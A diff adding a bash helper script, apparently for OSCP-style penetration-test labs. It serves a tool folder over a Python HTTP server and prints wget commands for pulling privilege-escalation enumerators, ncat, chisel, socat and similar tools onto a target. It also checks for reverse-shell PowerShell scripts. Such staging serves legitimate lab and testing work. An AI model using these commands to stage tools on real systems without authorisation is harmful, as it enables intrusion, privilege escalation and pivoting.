@@ -1,0 +1,142 @@
+#!/usr/bin/env bash
+
+# Function to print a simple divider
+print_divider() {
+    local divider_character="$1"
+    local screen_width
+    screen_width=$(tput cols)
+    local divider_line=""
+    for ((i = 0; i < screen_width; i++)); do
+        divider_line+="$divider_character"
+    done
+    echo "$divider_line"
+}
+
+# Exit on any error
+set -e
+
+# Default port for the Python web server
+default_port=8000
+
+# Ask user for port number
+read -p "$(tput setaf 4)Enter port number for Python web server (default is $default_port):$(tput sgr0) " port_number
+
+# Use default port if no input is provided
+port="${port_number:-$default_port}"
+
+# Default directory to list (can be overridden by the first argument)
+#directory="${1:-.}"
+directory="${1:-/home/$USER/oscp_res/privEsc/windows}"
+
+# Print a simple divider
+print_divider -
+
+# Feedback - location
+echo "$(tput setaf 4)Directory: $(tput sgr0)$directory"
+
+# Print a simple divider
+print_divider -
+
+# Function to list files
+list_files() {
+    # Using ls without colors
+    ls -p "$directory" | while read -r line; do
+        echo "$line"
+    done | column
+}
+
+# Using custom function for listing files
+echo "$(tput setaf 2)Directory listing:$(tput sgr0)"
+list_files
+
+# Print a simple divider
+print_divider =
+
+
+
+
+
+# Ask user to choose a network interface
+echo "$(tput setaf 2)Choose a network interface:$(tput sgr0)"
+interfaces=$(ip -o -4 addr show | awk '{print $2, $4}' | cut -d/ -f1)
+select interface in $interfaces; do
+    if [ -n "$interface" ]; then
+        # Get the IP address of the chosen interface
+        chosen_ip=$(echo "$interface" | cut -d' ' -f2)
+
+        # Print a simple divider
+        print_divider -
+
+        # Displaying the URLs of the running Python web server for the chosen interface
+        echo "$(tput setaf 2)Python Web Server URLs for $chosen_ip:$(tput sgr0)"
+        echo "http://$chosen_ip:$port"
+
+        # Print a simple divider
+        print_divider =
+
+
+        # Print the bash command to download and priv Esc Enum Scripts
+        echo ""
+        echo "$(tput setaf 1)  2.Priv Esc Enum Scripts  $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/linpeas $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/linpeas.sh $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/LinEnum.sh $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/unix-privesc-check $(tput sgr0)"
+        
+        echo ""
+        echo "$(tput setaf 1)  2.Process Enum Scripts  $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/pspy $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/pspy32 $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/pspy64 $(tput sgr0)"
+
+
+        # Print the static binaries to download and priv Esc Enum Scripts
+        echo ""
+        echo "$(tput setaf 1)  2.Static binaries  $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/staticBins/x64/ncat $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/staticBins/x64/nmap $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/staticBins/x64/p0f  $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/staticBins/x64/strings $(tput sgr0)"
+        
+        # Print the Port Forwarding binaries to download and priv Esc Enum Scripts
+        echo ""
+        echo "$(tput setaf 1)  2.Static binaries  $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/chisel $(tput sgr0)"
+        echo "$(tput setaf 3)  wget http://$chosen_ip:$port/socat $(tput sgr0)"
+
+
+
+    else
+        echo "$(tput setaf 1)Invalid choice. Please select a valid network interface.$(tput sgr0)"
+    fi
+    break
+done
+
+print_divider =
+
+
+
+# Function to check if contty_revshell.ps1 is present in the current directory
+check_revshell() {
+  echo "$(tput setaf 2)[*]Checking if contty_revshell.ps1 is present or not $(tput sgr0)"
+    if [ -e "contty_revshell.ps1" ]; then
+        echo -e "  $(tput setaf 3)contty_revshell.ps1 $(tput sgr0) $(tput setaf 2)\u2713 found. $(tput sgr0)"
+    else
+        echo -e "$(tput setaf 1)contty_revshell.ps1 not found. $(tput sgr0)"
+    fi
+
+    if [ -e "Invoke-PowerShellTcp.ps1" ]; then
+        echo -e "  $(tput setaf 3)Invoke-PowerShellTcp.ps1 $(tput sgr0) $(tput setaf 2)\u2713 found. $(tput sgr0)"
+    else
+        echo -e "$(tput setaf 1)Invoke-PowerShellTcp.ps1 not found. $(tput sgr0)"
+    fi
+}
+check_revshell
+
+# Print a simple divider
+print_divider =
+ 
+# Start the HTTP server
+echo "$(tput setaf 2)Starting HTTP server on port $port...$(tput sgr0)"
+#python3 -m http.server "$port" --directory "$directory"
+python3 -m http.server "$port"
